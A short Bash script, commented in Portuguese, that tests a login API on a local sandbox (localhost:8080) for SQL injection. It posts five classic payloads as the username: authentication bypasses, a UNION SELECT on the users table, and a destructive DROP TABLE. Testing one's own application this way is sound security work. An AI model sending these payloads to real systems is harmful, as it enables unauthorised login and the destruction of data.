#!/bin/bash
# ============================================
# TESTE DE SQL INJECTION
# Sandbox Ravena
# ============================================

echo "============================================"
echo "  TESTE DE SQL INJECTION"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api/auth/login"
echo ""

# Payloads de SQL Injection
PAYLOADS=(
    "' OR 1=1--"
    "admin'--"
    "' UNION SELECT * FROM users--"
    "1' AND '1'='1"
    "'; DROP TABLE users--"
)

echo "Testando payloads..."
echo ""

for payload in "${PAYLOADS[@]}"; do
    echo "Payload: $payload"
    curl -s -X POST "$TARGET/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$payload\", \"password\": \"test\"}" \
        | python3 -m json.tool 2>/dev/null || echo "Resposta não é JSON"
    echo "---"
done

echo ""
echo "Teste concluído!"
